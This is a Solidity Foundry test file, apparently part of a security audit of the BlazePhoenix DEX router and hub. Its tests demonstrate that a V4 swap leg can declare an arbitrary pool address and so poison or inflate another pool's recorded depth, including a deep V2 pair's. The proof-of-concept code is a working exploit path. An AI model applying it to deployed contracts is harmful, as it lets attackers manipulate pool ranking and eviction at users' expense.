// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.36;

import {Test} from "forge-std/Test.sol";
import {BlazePhoenixHub} from "../src/BlazePhoenixHub.sol";
import {BlazePhoenixSolver} from "../src/BlazePhoenixSolver.sol";
import {BlazePhoenixRouter} from "../src/BlazePhoenixRouter.sol";
import {BlazePhoenixCore as BPC, Route, Hop, Leg} from "../src/BlazePhoenixCore.sol";

contract MockERC20Simple {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 amt) public returns (bool) {
        balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true;
    }
    function transferFrom(address from, address to, uint256 amt) public returns (bool) {
        balanceOf[from] -= amt; balanceOf[to] += amt; return true;
    }
}

interface IERC20Min { function transfer(address, uint256) external returns (bool); }

/// @dev V4 manager mock that ALSO answers `extsload`, so `Core.v4SqrtAndLiq`
///      returns a real (sqrtPrice, liquidity) per poolId. Without extsload every
///      V4 pool reads as depth 0 and the measurement under test is invisible.
contract ExtsloadV4Manager {
    struct V4PoolKey { address currency0; address currency1; uint24 fee; int24 tickSpacing; address hooks; }
    struct SwapParams { bool zeroForOne; int256 amountSpecified; uint160 sqrtPriceLimitX96; }

    mapping(bytes32 => bytes32) private st;
    uint24  public lastFee;
    int24   public lastTickSpacing;

    function setPool(bytes32 pid, uint160 sp, uint128 liq) external {
        bytes32 base = keccak256(abi.encode(pid, uint256(6)));
        st[base] = bytes32(uint256(sp));
        st[bytes32(uint256(base) + 3)] = bytes32(uint256(liq));
    }

    function extsload(bytes32 slot) external view returns (bytes32) { return st[slot]; }

    function _pack(int128 d0, int128 d1) internal pure returns (int256) {
        return int256((uint256(uint128(d0)) << 128) | uint256(uint128(d1)));
    }

    function unlock(bytes calldata data) external returns (bytes memory) {
        (bool ok, bytes memory ret) =
            msg.sender.call(abi.encodeWithSignature("unlockCallback(bytes)", data));
        require(ok, "unlock: callback reverted");
        return ret;
    }

    function swap(V4PoolKey calldata key, SwapParams calldata p, bytes calldata)
        external returns (int256)
    {
        lastFee = key.fee;
        lastTickSpacing = key.tickSpacing;
        uint256 amt = uint256(-p.amountSpecified);
        int128 owe  = -int128(int256(amt));
        int128 recv =  int128(int256(amt));
        return p.zeroForOne ? _pack(owe, recv) : _pack(recv, owe);
    }

    function sync(address) external {}
    function settle() external payable returns (uint256) { return 0; }
    function take(address currency, address to, uint256 amount) external {
        IERC20Min(currency).transfer(to, amount);
    }
}

/// @notice OBJECTION: `Router._recordHits` (src/BlazePhoenixRouter.sol:2114) tells the Hub
///         "leg `leg.pool` executed, and here is its measured depth". For A_CONC_SING kinds
///         (KIND_V4 / KIND_V4_NATIVE) the code assumes `leg.pool` names the pool that
///         executed; NOTHING forces it. `_execV4Amt` (:1815) and `_v4LegQuote` (:920) build
///         the pool key from (hop.tokenIn, leg.auxId, leg.fee, leg.tickSpacing, leg.hooks)
///         and never read `leg.pool` at all — grep of the Router shows `leg.pool` used only
///         on the reserve/concentrated arms and, for V4, at the recordSwap call site.
///
///         The depth handed with it IS measured — but from the poolId `_recordHits`
///         RE-DERIVES (:2094), i.e. from the pool that really executed. So the pair is
///         (honest measurement, declared identity) and the Hub's hot path
///         (BlazePhoenixHub.sol:1595-1607) applies `tickSlot` — which rewrites the depth
///         bucket UNCONDITIONALLY (Core:1999) — to `keyOf(leg.pool, t0, t1)` with no
///         identity check whatsoever. The cold path proves the pool (`_recoverV4Ts`,
///         :1643); the hot path proves nothing.
contract V4LegPoolIdentityTest is Test {
    BlazePhoenixHub    hub;
    BlazePhoenixRouter router;
    ExtsloadV4Manager  mgr;
    MockERC20Simple A;
    MockERC20Simple B;

    address treasury1 = makeAddr("t1");
    address treasury2 = makeAddr("t2");
    address user      = makeAddr("user");

    uint160 constant Q96 = uint160(uint256(1) << 96);

    function setUp() public {
        mgr = new ExtsloadV4Manager();
        hub = new BlazePhoenixHub(address(this));
        hub.initialize(address(this), address(mgr));
        BlazePhoenixSolver solver = new BlazePhoenixSolver(address(hub));
        router = new BlazePhoenixRouter(
            address(hub), address(solver), address(this), treasury1, treasury2);
        // The Router must BE the router role, or recordSwap dies in the try/catch.
        hub.setRoles(address(router), address(solver), address(this));
        A = new MockERC20Simple();
        B = new MockERC20Simple();
        A.mint(user, 1_000e18);
        B.mint(address(mgr), 1_000e18);
    }

    function _pid(uint24 fee, int24 ts) internal view returns (bytes32) {
        (address t0, address t1) = BPC.sortTokens(address(A), address(B));
        return BPC.computeV4PoolId(t0, t1, fee, ts, address(0));
    }

    function _swap(uint24 fee, int24 ts, address declaredPool, uint256 amt) internal {
        Leg memory leg = Leg({
            pool: declaredPool,
            hooks: address(0), kind: BPC.KIND_V4, fee: fee, tickSpacing: ts,
            zeroForOne: address(A) < address(B), stable: false,
            amountIn: amt, expectedOut: 0,
            auxId: bytes32(uint256(uint160(address(B))))
        });
        Leg[] memory legs = new Leg[](1); legs[0] = leg;
        Hop[] memory hops = new Hop[](1);
        hops[0] = Hop({tokenIn: address(A), tokenOut: address(B),
                       amountIn: amt, expectedOut: 0, legs: legs});
        Route memory r;
        r.hops = hops;
        vm.prank(user);
        router.swapExactIn(r, amt, 1, user, block.timestamp + 1);
    }

    function _bucket(bytes32 key) internal view returns (uint8) {
        return uint8((hub.getSlot(key) >> 60) & 0xF);
    }

    /// @notice COUNTEREXAMPLE. Two V4 pools on the same pair:
    ///           DEEP  = (fee 500,  ts 10)  liquidity 1e24  -> depth bucket 9
    ///           DUST  = (fee 3000, ts 60)  liquidity 1e9   -> depth bucket 0
    ///         Swap 1 is honest: it executes on DEEP and declares DEEP. The registry row
    ///         keyed on DEEP is created with bucket 9.
    ///         Swap 2 executes on DUST — a pool anyone can create — but writes DEEP's
    ///         address into `leg.pool`. Execution never touches DEEP.
    ///
    ///         PREDICTION: RED. DEEP's depth bucket is rewritten with DUST's measurement.
    ///         If the identity were confirmed anywhere, this would be GREEN.
    function test_V4LegDeclaredPoolIsNeverConfirmed() public {
        bytes32 pidDeep = _pid(500, 10);
        bytes32 pidDust = _pid(3000, 60);
        mgr.setPool(pidDeep, Q96, 1e24);
        mgr.setPool(pidDust, Q96, 1e9);

        address deepAddr = address(uint160(uint256(pidDeep)));
        bytes32 keyDeep  = hub.keyOf(deepAddr, address(A), address(B));

        // 1) honest: execute DEEP, declare DEEP
        _swap(500, 10, deepAddr, 1e18);
        uint8 bucketHonest = _bucket(keyDeep);
        emit log_named_uint("bucket after honest DEEP swap", bucketHonest);
        assertGt(bucketHonest, 0, "setup: honest registration must carry a real depth bucket");

        // 2) attack: execute DUST, declare DEEP
        _swap(3000, 60, deepAddr, 1e15);
        assertEq(mgr.lastFee(), 3000, "setup: swap 2 must really have executed on DUST");

        uint8 bucketAfter = _bucket(keyDeep);
        emit log_named_uint("bucket after DUST swap declaring DEEP", bucketAfter);

        assertEq(
            bucketAfter, bucketHonest,
            "a swap that never touched DEEP rewrote DEEP's registry depth"
        );
    }

    /// @notice The same lever pointed the other way: a swap on a DEEP pool the attacker
    ///         controls, declared against a SHALLOW registered row, INFLATES that row.
    ///         Same objection, opposite sign — this is the admission/eviction side
    ///         (`Hub._canInsert` ranks incumbents by `_psiOfSlot`, which reads the bucket).
    function test_V4LegDeclaredPoolInflatesAForeignRow() public {
        bytes32 pidDust = _pid(3000, 60);
        bytes32 pidDeep = _pid(500, 10);
        mgr.setPool(pidDust, Q96, 1e9);
        mgr.setPool(pidDeep, Q96, 1e24);

        address dustAddr = address(uint160(uint256(pidDust)));
        bytes32 keyDust  = hub.keyOf(dustAddr, address(A), address(B));

        _swap(3000, 60, dustAddr, 1e15);          // honest: register DUST at its real depth
        uint8 b0 = _bucket(keyDust);
        emit log_named_uint("DUST bucket, honestly registered", b0);

        _swap(500, 10, dustAddr, 1e18);           // execute DEEP, declare DUST
        uint8 b1 = _bucket(keyDust);
        emit log_named_uint("DUST bucket after borrowing DEEP's measurement", b1);

        assertEq(b1, b0, "a shallow row absorbed a foreign pool's depth measurement");
    }

    /// @notice THE REALISTIC HARM. The poisoned row does not have to be a V4 row: the key is
    ///         `keyOf(leg.pool, t0, t1)` and nothing ties `leg.pool` to a kind. A dust V4 pool
    ///         — anyone can initialise one — knocks the pair's DEEPEST V2 pair down to
    ///         bucket 0, which is the bucket `Hub._canInsert` reads to pick the next
    ///         eviction victim and `getActivePools` reads to rank the funnel.
    ///
    ///         PREDICTION: RED.
    function test_DustV4PoolPoisonsTheDeepestV2RowOnTheSamePair() public {
        // A real, deep V2 pair on (A, B), registered by an honest swap through it.
        MockV2PairLite pair = new MockV2PairLite(address(A), address(B));
        A.mint(address(pair), 5_000_000e18);
        B.mint(address(pair), 5_000_000e18);
        pair.setReserves(uint112(5_000_000e18), uint112(5_000_000e18));

        _v2Swap(address(pair), 1e18);
        bytes32 keyPair = hub.keyOf(address(pair), address(A), address(B));
        uint8 honest = _bucket(keyPair);
        emit log_named_uint("deep V2 pair bucket, honestly registered", honest);
        assertGe(honest, 6, "setup: the honest V2 pair must sit in a deep bucket");

        // The attacker's dust V4 pool, executed — but declared as the V2 pair.
        bytes32 pidDust = _pid(3000, 60);
        mgr.setPool(pidDust, Q96, 1e9);
        _swap(3000, 60, address(pair), 1e15);

        uint8 after_ = _bucket(keyPair);
        emit log_named_uint("deep V2 pair bucket after the dust V4 swap", after_);
        assertEq(after_, honest,
            "a dust V4 swap rewrote the depth of a V2 pair it never touched");
    }

    function _v2Swap(address pair, uint256 amt) internal {
        Leg memory leg = Leg({
            pool: pair, hooks: address(0), kind: BPC.KIND_V2, fee: 30, tickSpacing: 0,
            zeroForOne: address(A) < address(B), stable: false,
            amountIn: amt, expectedOut: 0, auxId: bytes32(0)
        });
        Leg[] memory legs = new Leg[](1); legs[0] = leg;
        Hop[] memory hops = new Hop[](1);
        hops[0] = Hop({tokenIn: address(A), tokenOut: address(B),
                       amountIn: amt, expectedOut: 0, legs: legs});
        Route memory r; r.hops = hops;
        vm.prank(user);
        router.swapExactIn(r, amt, 1, user, block.timestamp + 1);
    }
}

interface IERC20Lite { function transfer(address, uint256) external returns (bool); function balanceOf(address) external view returns (uint256); }

/// @dev MockV2Pair, local copy (the shared one imports a different ERC20 shape).
contract MockV2PairLite {
    address public token0;
    address public token1;
    uint112 public reserve0;
    uint112 public reserve1;
    constructor(address a, address b) { (token0, token1) = a < b ? (a, b) : (b, a); }
    function setReserves(uint112 r0, uint112 r1) external { reserve0 = r0; reserve1 = r1; }
    function getReserves() external view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, uint32(block.timestamp));
    }
    function swap(uint256 a0, uint256 a1, address to, bytes calldata) external {
        if (a0 > 0) IERC20Lite(token0).transfer(to, a0);
        if (a1 > 0) IERC20Lite(token1).transfer(to, a1);
        reserve0 = uint112(IERC20Lite(token0).balanceOf(address(this)));
        reserve1 = uint112(IERC20Lite(token1).balanceOf(address(this)));
    }
}
